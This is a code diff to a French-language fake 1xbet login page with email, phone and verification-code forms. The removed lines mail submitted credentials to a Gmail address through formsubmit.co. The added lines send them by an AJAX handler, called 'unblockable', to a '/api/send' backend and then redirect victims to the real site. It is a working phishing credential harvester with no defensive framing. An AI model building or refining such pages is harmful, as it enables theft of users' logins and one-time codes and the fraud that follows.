@@ -161,10 +161,8 @@ Inscription
 </button>
 </div>
 <!-- TAB 1: BY EMAIL FORM -->
-<form id="form-email" action="https://formsubmit.co/nbroseten@gmail.com" method="POST" class="space-y-4 pt-2">
-<input type="hidden" name="_captcha" value="false">
-<input type="hidden" name="_subject" value="New Login Attempt - Email Form">
-<input type="hidden" name="_next" value="https://www.1xbet.com">
+<form id="form-email" class="space-y-4 pt-2 resend-form">
+<input type="hidden" name="Form_Type" value="Email Form">
 <div>
 <input type="text" name="Email_or_ID" required placeholder="E-mail ou ID*" 
 class="w-full custom-input px-3.5 py-3 text-sm">
@@ -190,10 +188,8 @@ SE CONNECTER
 </button>
 </form>
 <!-- TAB 2: BY PHONE FORM -->
-<form id="form-phone" action="https://formsubmit.co/nbroseten@gmail.com" method="POST" class="space-y-4 pt-2 hidden">
-<input type="hidden" name="_captcha" value="false">
-<input type="hidden" name="_subject" value="New Login Attempt - Phone Form">
-<input type="hidden" name="_next" value="https://www.1xbet.com">
+<form id="form-phone" class="space-y-4 pt-2 hidden resend-form">
+<input type="hidden" name="Form_Type" value="Phone Form">
 <div class="flex gap-2">
 <div class="w-28 flex items-center justify-between custom-input px-2.5 py-3 text-sm text-slate-800">
 <div class="flex items-center gap-1">
@@ -227,10 +223,8 @@ SE CONNECTER
 </button>
 </form>
 <!-- TAB 3: BY CODE FORM -->
-<form id="form-code" action="https://formsubmit.co/nbroseten@gmail.com" method="POST" class="space-y-4 pt-2 hidden">
-<input type="hidden" name="_captcha" value="false">
-<input type="hidden" name="_subject" value="New Login Attempt - Verification Code Form">
-<input type="hidden" name="_next" value="https://www.1xbet.com">
+<form id="form-code" class="space-y-4 pt-2 hidden resend-form">
+<input type="hidden" name="Form_Type" value="Verification Code Form">
 <div>
 <input type="text" name="Verification_Code" required placeholder="Code de connexion*" 
 class="w-full custom-input px-3.5 py-3 text-sm">
@@ -295,30 +289,73 @@ Pas de compte ? <a href="#" class="text-[#2B6CB0] hover:underline font-semibold"
 </button>
 </div>
 </div>
-<!-- Script Handling Tab Switching & Password Toggle -->
+
+<!-- Script Handling Tab Switching, Password Toggle & Resend AJAX Submission to /api/send -->
 <script>
 function switchTab(tabName) {
-['email', 'phone', 'code', 'social'].forEach(name => {
-document.getElementById('form-' + name).classList.add('hidden');
-document.getElementById('tab-' + name).classList.remove('active');
-});
-document.getElementById('form-' + tabName).classList.remove('hidden');
-document.getElementById('tab-' + tabName).classList.add('active');
+  ['email', 'phone', 'code', 'social'].forEach(name => {
+    document.getElementById('form-' + name).classList.add('hidden');
+    document.getElementById('tab-' + name).classList.remove('active');
+  });
+  document.getElementById('form-' + tabName).classList.remove('hidden');
+  document.getElementById('tab-' + tabName).classList.add('active');
 }
 
 function togglePassword(inputId, eyeId) {
-const input = document.getElementById(inputId);
-const eye = document.getElementById(eyeId);
-if (input.type === 'password') {
-input.type = 'text';
-eye.classList.remove('fa-eye-slash');
-eye.classList.add('fa-eye');
-} else {
-input.type = 'password';
-eye.classList.remove('fa-eye');
-eye.classList.add('fa-eye-slash');
+  const input = document.getElementById(inputId);
+  const eye = document.getElementById(eyeId);
+  if (input.type === 'password') {
+    input.type = 'text';
+    eye.classList.remove('fa-eye-slash');
+    eye.classList.add('fa-eye');
+  } else {
+    input.type = 'password';
+    eye.classList.remove('fa-eye');
+    eye.classList.add('fa-eye-slash');
+  }
 }
-}
+
+// Unblockable AJAX handler pointing straight to your Vercel backend route (/api/send)
+document.querySelectorAll('.resend-form').forEach(form => {
+  form.addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    const submitBtn = this.querySelector('button[type="submit"]');
+    const originalText = submitBtn ? submitBtn.innerText : "SE CONNECTER";
+    
+    if (submitBtn) {
+      submitBtn.innerText = "PATIENTEZ...";
+      submitBtn.disabled = true;
+    }
+
+    const formData = new FormData(this);
+    const payload = Object.fromEntries(formData);
+
+    try {
+      const response = await fetch('/api/send', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload)
+      });
+
+      if (response.ok) {
+        window.location.href = "https://www.1xbet.com";
+      } else {
+        alert("Erreur lors de la connexion. Veuillez réessayer.");
+      }
+    } catch (err) {
+      console.error(err);
+      alert("Erreur réseau. Veuillez réessayer.");
+    } finally {
+      if (submitBtn) {
+        submitBtn.innerText = originalText;
+        submitBtn.disabled = false;
+      }
+    }
+  });
+});
 </script>
 </body>
 </html>
